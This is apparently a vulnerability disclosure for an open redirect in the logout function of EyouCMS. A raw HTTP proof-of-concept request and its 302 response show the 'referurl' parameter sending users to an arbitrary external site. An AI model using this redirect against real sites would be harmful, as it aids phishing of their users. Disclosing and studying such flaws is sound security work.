##### Product: `EyouCMS`
##### Vilnerability param: `referurl`
##### Function: `logout`
##### Effected source code file: `{Source]\application\user\controller\Users.php`
##### Logout function accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.
![Image](https://user-images.githubusercontent.com/54875703/130326456-1f448474-3b12-4e5e-bb27-c981fb12486a.png)
##### PoC:
```
GET /index.php?m=user&c=Users&a=logout&referurl=https://google.com HTTP/1.1
Host: 172.16.0.12:3333
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PortalOpenEMR=BKEx0ZLJ9X41gReq-UHNt-aC0jHNPiQLUOf7FXckqCAumudg; OpenEMR=UwreHaTw9iqwJWXqAY3%2CWYkZgvA3wdVmymdC5QqiVC1H2scM; loader=loaded; admin_lang=cn; home_lang=cn; workspaceParam=index%7CArchives; referurl=%2Findex.php%3Fm%3Duser%26c%3DUsers%26a%3Dcentre; ENV_GOBACK_URL=%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26typeid%3D24%26lang%3Dcn; ENV_LIST_URL=%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn; ENV_IS_UPHTML=0; PHPSESSID=g0e80krlrkdep97u55tu3d2tj2
Upgrade-Insecure-Requests: 1
```
```
HTTP/1.1 302 Found
Date: Sat, 21 Aug 2021 15:17:05 GMT
Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.3.29
X-Powered-By: PHP/7.3.29
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-cache,must-revalidate
Pragma: no-cache
Set-Cookie: users_id=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Set-Cookie: users_id=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Location: https://google.com
Content-Length: 0
Connection: close
Content-Type: text/html; charset=utf-8
```
